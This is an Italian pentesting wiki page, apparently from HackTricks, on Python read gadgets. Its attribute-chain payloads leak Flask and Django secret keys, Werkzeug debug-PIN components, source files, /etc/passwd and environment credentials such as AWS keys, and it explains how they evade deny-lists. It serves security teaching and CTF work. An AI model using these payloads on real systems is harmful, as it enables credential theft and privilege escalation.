# Gadget di lettura interna di Python

{{#include ../../banners/hacktricks-training.md}}


## Informazioni di base

Diverse vulnerabilità, come [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) o [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), potrebbero consentire di **leggere dati interni di Python, ma non di eseguire codice**. Pertanto, un pentester dovrà sfruttare al massimo questi permessi di lettura per **ottenere privilegi sensibili ed escalare la vulnerabilità**.

### Flask - Lettura della secret key

La pagina principale di un'applicazione Flask probabilmente avrà l'oggetto globale **`app`**, dove questa **secret è configurata**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In questo caso è possibile accedere a questo oggetto utilizzando qualsiasi gadget per **accedere agli oggetti globali** dalla [**pagina Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Nel caso in cui **la vulnerabilità si trovi in un file Python diverso**, è necessario un gadget per attraversare i file e raggiungere quello principale, così da **accedere all'oggetto globale `app.secret_key`** e poter [**escalate privileges** conoscendo questa chiave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload come questo [da questo writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Usa questo payload per **leggere `app.secret_key`**. Se il bug originale ti fornisce anche una primitiva di scrittura (ad esempio, class pollution), puoi usare lo stesso percorso per sostituirla e firmare cookie Flask con privilegi maggiori.

### Werkzeug - machine_id e node uuid

[**Usando questi payload da questo writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) potrai accedere al **machine_id** e al nodo **uuid**, che sono i **componenti privati** necessari per [**generare il pin di Werkzeug**](../../network-services-pentesting/pentesting-web/werkzeug.md) e accedere alla console Python in `/console` se la **modalità debug è abilitata**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Nota che puoi ottenere il **percorso locale del server relativo a `app.py`** generando qualche **errore** nella pagina web che ti **mostrerà il percorso**.

Se la vulnerabilità si trova in un file Python diverso, controlla il precedente trucco di Flask per accedere agli oggetti dal file Python principale.

### Django - SECRET_KEY e modulo settings

L'oggetto delle impostazioni di Django viene memorizzato nella cache in `sys.modules` una volta avviata l'applicazione. Con le sole primitive di lettura puoi ottenere in un leak la **`SECRET_KEY`**, le chiavi di fallback, le credenziali del database o i salt per la firma:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Se il gadget vulnerabile si trova in un altro modulo, esamina prima i globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` sono altrettanto preziose quanto l'attuale `SECRET_KEY`: continuano a validare i valori firmati precedenti durante la rotazione.<sup>[[1]](#references)</sup> Inoltre, fai trapelare `SESSION_ENGINE` e `SESSION_SERIALIZER` per determinare rapidamente se l'impatto riguarda solo la falsificazione dei cookie o qualcosa di più grave. Per i dettagli sull'impatto web, consulta la [**pagina di pentesting di Django**](../../network-services-pentesting/pentesting-web/django.md).

### Gadget dei module loader - lettura del codice sorgente e dei file

I moduli Python caricati mantengono generalmente un `__loader__`. I loader basati su file espongono spesso `get_source()` e `get_data()`, che sono primitive di **sola lettura** perfette quando puoi già raggiungere un oggetto modulo ma non `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Questo è molto utile per fare il dump di **moduli di configurazione, blueprint, file helper o route nascoste** e recuperare API keys, DSN, percorsi dei flag o ulteriori gadget entry points.

Se disponi solo dell'enumerazione delle sottoclassi, cerca il loader per nome invece di codificare direttamente un indice:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals del frame di generator / coroutine

Se puoi creare o raggiungere un oggetto generator/coroutine, il suo frame può esporre i globals **senza aver bisogno di alcun gadget `__globals__` di una funzione**. È utile contro i filtri che bloccano solo i nomi dunder e dimenticano gli attributi del frame come `gi_frame`, `ag_frame`, `cr_frame` o `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Una volta ottenuti i globali del frame, continua esattamente come negli altri gadget (`sys.modules`, oggetti `settings`, `os.environ`, ecc.). I recenti sandbox escapes continuano a riscoprire questo aspetto perché `gi_frame` e `f_globals` non sono attributi dunder e spesso sopravvivono a deny-list ingenue.

### Variabili d'ambiente / credenziali cloud tramite moduli caricati

Molti jail importano ancora `os` o `sys` da qualche parte. Puoi abusare di qualsiasi funzione raggiungibile `__init__.__globals__` per eseguire il pivot verso il modulo `os` già importato ed estrarre le **variabili d'ambiente** contenenti token API, chiavi cloud o flag:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Se l'indice della sottoclasse è filtrato, usa i loader:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Le variabili d'ambiente sono spesso gli unici segreti necessari per passare dalla lettura alla compromissione completa (chiavi cloud IAM, URL di database, chiavi di firma, ecc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) consentiva la **class pollution** tramite richieste a componenti appositamente costruite. Impostare un percorso di proprietà come `__init__.__globals__` permetteva all'attaccante di raggiungere le variabili globali del modulo del componente e qualsiasi modulo importato (ad es. `settings`, `os`, `sys`). Da lì era possibile ottenere un leak di `SECRET_KEY`, `DATABASES` o delle credenziali dei servizi senza esecuzione di codice. La catena di exploit è basata esclusivamente sulla lettura e utilizza gli stessi pattern di dunder-gadget descritti sopra.<sup>[[5]](#references)</sup>

### Gadget collections for chaining

I CTF recenti e la ricerca sui pyjail mostrano catene di lettura affidabili costruite utilizzando esclusivamente l'accesso agli attributi e l'enumerazione delle sottoclassi. Liste gestite dalla community, come [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), catalogano centinaia di gadget minimi combinabili per attraversare gli oggetti fino a `__globals__`, `sys.modules` e infine ai dati sensibili.<sup>[[2]](#references)</sup> Preferite ricerche basate su **attributi/nomi** rispetto agli indici grezzi delle sottoclassi, perché la posizione di `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, ecc. cambia tra le versioni di Python e in presenza di librerie aggiuntive importate.

## Riferimenti

- [1] [Documentazione sulla firma crittografica di Django](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki dei gadget per sandbox Python](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – writeup FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Vulnerabilità di Class Pollution in Django-Unicorn, che porta a RCE, XSS, DoS e bypass dell'autenticazione (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)

{{#include ../../banners/hacktricks-training.md}}
